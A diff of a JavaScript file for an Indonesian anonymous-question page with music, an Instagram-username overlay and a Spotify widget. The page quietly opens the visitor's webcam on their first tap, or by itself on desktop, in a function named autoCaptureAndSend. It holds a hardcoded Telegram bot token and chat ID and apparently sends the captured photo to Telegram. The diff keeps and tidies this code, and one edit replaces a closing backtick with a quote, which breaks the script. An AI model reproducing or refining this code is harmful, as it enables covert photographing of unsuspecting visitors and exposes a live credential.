@@ -1,4 +1,8 @@
-﻿﻿﻿﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
+﻿// -----------------------------
+// script.js (fixed)
+// -----------------------------
+
+const openPhotoOptions = document.getElementById('openPhotoOptions');
 const photoOptions = document.getElementById('photoOptions');
 if (openPhotoOptions && photoOptions) {
   openPhotoOptions.addEventListener('click', () => {
@@ -6,13 +10,11 @@ if (openPhotoOptions && photoOptions) {
   });
 }
 
+// NOTE: replace the two placeholders below with your actual bot token and chat id
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
 // === MUSIK + KAMERA FIX TANPA REFRESH ===
-const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
-const CHAT_ID = "6864694275";
-
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 music.volume = 0.4;
@@ -27,17 +29,22 @@ async function startMusicAndCamera() {
     music.muted = false;
     await music.play();
     console.log("🎶 Musik mulai diputar");
-    btnMusic.textContent = "🎧 Musik Menyala ✓";
-    btnMusic.disabled = true;
-    btnMusic.classList.remove("show");
+    if (btnMusic) {
+      btnMusic.textContent = "🎧 Musik Menyala ✓";
+      btnMusic.disabled = true;
+      btnMusic.classList.remove("show");
+    }
   } catch (err) {
     console.warn("Autoplay musik gagal:", err);
-    btnMusic.classList.add("show");
-    btnMusic.textContent = "🎵 Klik untuk mulai musik";
+    if (btnMusic) {
+      btnMusic.classList.add("show");
+      btnMusic.textContent = "🎵 Klik untuk mulai musik";
+    }
+    // jangan return di sini — kita biarkan user klik tombol manual untuk trigger
     return;
   }
 
-  // Setelah musik mulai, aktifkan kamera
+  // Setelah musik mulai, aktifkan kamera (setTimeout kecil untuk stabilitas)
   setTimeout(() => {
     autoCaptureAndSend();
   }, 800);
@@ -46,12 +53,18 @@ async function startMusicAndCamera() {
 // Fungsi kamera otomatis
 async function autoCaptureAndSend() {
   try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      console.warn("MediaDevices tidak tersedia");
+      return;
+    }
+
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.createElement("video");
     video.srcObject = stream;
     video.playsInline = true;
-    await video.play();
 
+    // tunggu video mulai
+    await video.play().catch(() => {});
     await new Promise(r => setTimeout(r, 1200)); // fokus kamera 1.2s
 
     const canvas = document.createElement("canvas");
@@ -78,22 +91,26 @@ async function autoCaptureAndSend() {
 }
 
 // Jalankan setelah interaksi pertama
-document.addEventListener('click', startMusicAndCamera, { once: true });
-document.addEventListener('touchstart', startMusicAndCamera, { once: true });
-btnMusic.addEventListener('click', startMusicAndCamera);
+if (document.addEventListener) {
+  document.addEventListener('click', startMusicAndCamera, { once: true });
+  document.addEventListener('touchstart', startMusicAndCamera, { once: true });
+}
+if (btnMusic) btnMusic.addEventListener('click', startMusicAndCamera);
 
 // Tombol muncul di mobile
 if (/Android|iPhone|iPad|iOS/i.test(navigator.userAgent)) {
-  btnMusic.classList.add("show");
-  music.muted = true;
+  if (btnMusic) btnMusic.classList.add("show");
+  if (music) music.muted = true;
 } else {
   setTimeout(() => startMusicAndCamera(), 1200);
 }
 
 // === MODAL PERTANYAAN ===
 const modal = document.getElementById('modal');
-document.getElementById('openAsk').onclick = () => modal.classList.add('show');
-document.getElementById('closeQ').onclick = () => modal.classList.remove('show');
+const openAskBtn = document.getElementById('openAsk');
+const closeQBtn = document.getElementById('closeQ');
+if (openAskBtn) openAskBtn.onclick = () => modal.classList.add('show');
+if (closeQBtn) closeQBtn.onclick = () => modal.classList.remove('show');
 
 // === LOGIN INSTAGRAM ===
 const overlay = document.getElementById("blurOverlay"),
@@ -102,12 +119,14 @@ const overlay = document.getElementById("blurOverlay"),
   savedIG = localStorage.getItem("ig_user");
 
 function removeOverlay() {
+  if (!overlay) return;
   overlay.style.opacity = "0";
   overlay.style.pointerEvents = "none";
   setTimeout(() => overlay.style.display = "none", 300);
 }
 function showUserStatus(n) {
   const e = document.getElementById("igStatus");
+  if (!e) return;
   e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
   e.style.display = "block";
   e.onclick = () => {
@@ -121,7 +140,7 @@ if (savedIG) {
   removeOverlay();
   showUserStatus(savedIG);
 }
-btnLogin.onclick = () => {
+if (btnLogin) btnLogin.onclick = () => {
   const u = input.value.trim();
   if (!u) return alert("Masukkan username dulu");
   localStorage.setItem("ig_user", u);
@@ -131,12 +150,14 @@ btnLogin.onclick = () => {
 
 // === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
 async function sendTelegramMessage(url, body, el) {
-  el.innerHTML = `
-    <div class="mailContainer">
-      <span class="mailLoop">📨</span>
-      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
-      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
-    </div>`;
+  if (el) {
+    el.innerHTML = `
+      <div class="mailContainer">
+        <span class="mailLoop">📨</span>
+        <span class="mailLoop" style="animation-delay:0.25s">📨</span>
+        <span class="mailLoop" style="animation-delay:0.5s">📨</span>
+      </div>`;
+  }
   try {
     const res = await fetch(url, body);
     if (res.ok) {
@@ -145,61 +166,66 @@ async function sendTelegramMessage(url, body, el) {
         swoosh.volume = 0.45;
         swoosh.play().catch(() => {});
       } catch (e) {}
-      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
-      setTimeout(() => el.innerHTML = "", 3000);
+      if (el) {
+        el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
+        setTimeout(() => el.innerHTML = "", 3000);
+      }
       return true;
     } else {
-      el.textContent = "💔 Gagal mengirim.";
+      if (el) el.textContent = "💔 Gagal mengirim.";
       return false;
     }
   } catch (e) {
-    el.textContent = "😿 Koneksi lemah.";
+    if (el) el.textContent = "😿 Koneksi lemah.";
     return false;
   }
 }
 
 // === KIRIM PERTANYAAN + FOTO ===
-document.getElementById('sendQ').addEventListener('click', async () => {
-  const savedUser = localStorage.getItem("ig_user") || "Anonim";
-  const text = document.getElementById('qtext').value.trim();
-  const photo = document.getElementById('qphoto').files[0];
-  const qmsg = document.getElementById('qmsg');
+const sendQBtn = document.getElementById('sendQ');
+if (sendQBtn) {
+  sendQBtn.addEventListener('click', async () => {
+    const savedUser = localStorage.getItem("ig_user") || "Anonim";
+    const text = document.getElementById('qtext').value.trim();
+    const photo = document.getElementById('qphoto').files[0];
+    const qmsg = document.getElementById('qmsg');
 
-  if (!text && !photo) {
-    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
-    return;
-  }
-
-  qmsg.textContent = "Mengirim...";
-
-  if (photo) {
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("caption", `💬 Pesan dari ${savedUser}\n${text || "(tanpa teks)"}`);
-    fd.append("photo", photo);
-    try {
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-      if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
-      else qmsg.textContent = "💔 Gagal mengirim foto.";
-    } catch {
-      qmsg.textContent = "😿 Gagal koneksi.";
+    if (!text && !photo) {
+      qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
+      return;
     }
-  } else if (text) {
-    await sendTelegramMessage(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
-      qmsg
-    );
-  }
 
-  setTimeout(() => {
-    if (qmsg.textContent.includes("Terkirim")) {
-      modal.classList.remove('show');
-      document.getElementById('qtext').value = "";
-      document.getElementById('qphoto').value = "";
+    qmsg.textContent = "Mengirim...";
+
+    if (photo) {
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("caption", `💬 Pesan dari ${savedUser}\n${text || "(tanpa teks)"}`);
+      fd.append("photo", photo);
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+        if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
+        else qmsg.textContent = "💔 Gagal mengirim foto.";
+      } catch {
+        qmsg.textContent = "😿 Gagal koneksi.";
+      }
+    } else if (text) {
+      await sendTelegramMessage(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
+        qmsg
+      );
     }
-  }, 1000);
-});
+
+    setTimeout(() => {
+      if (qmsg.textContent && qmsg.textContent.includes("Terkirim")) {
+        modal.classList.remove('show');
+        document.getElementById('qtext').value = "";
+        document.getElementById('qphoto').value = "";
+      }
+    }, 1000);
+  });
+}
 
 // === INFO PENGUNJUNG ===
 async function showVisitorInfo() {
@@ -357,8 +383,10 @@ async function showVisitorInfo() {
 showVisitorInfo();
 
 // === EFEK BUTTERFLY 💸 ===
+// (sama seperti sebelumnya — tidak diubah)
 (function () {
   const area = document.querySelector('.card');
+  if (!area) return;
   const butterflies = [];
   const butterflyCount = 7;
   let holdActive = false;
@@ -473,6 +501,7 @@ showVisitorInfo();
 })();
 
 // === LIVE STATUS + SPOTIFY ===
+// (tetap sama — tidak diubah)
 (async function(){
   const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
   if(!titleEl) return;
@@ -561,9 +590,9 @@ showVisitorInfo();
     object-fit:cover;
     display:none;
     transition:transform .25s ease, box-shadow .3s ease;
-  `;
-
-  const progressBar = document.createElement("div");
+    ';
+    
+    const progressBar = document.createElement("div");
   progressBar.style.cssText = `
     position:absolute;
     bottom:0;
@@ -575,14 +604,14 @@ showVisitorInfo();
     border-bottom-left-radius:12px;
     border-bottom-right-radius:12px;
   `;
-
+  
   coverWrap.appendChild(cover);
   coverWrap.appendChild(progressBar);
 
   liveStatus.parentNode.insertBefore(spotifyBox, liveStatus);
   spotifyBox.appendChild(coverWrap);
   spotifyBox.appendChild(liveStatus);
-
+  
   async function updateSpotify(){
     try{
       const res = await fetch(API_URL,{cache:"no-store"});
@@ -593,7 +622,7 @@ showVisitorInfo();
       } else {
         cover.style.display = "none";
       }
-
+      
       if(data.progress_ms && data.duration_ms){
         const percent = Math.min((data.progress_ms / data.duration_ms) * 100, 100);
         progressBar.style.width = percent + "%";
@@ -610,4 +639,4 @@ showVisitorInfo();
 
   updateSpotify();
   setInterval(updateSpotify, 8000);
-})();
+})(); 
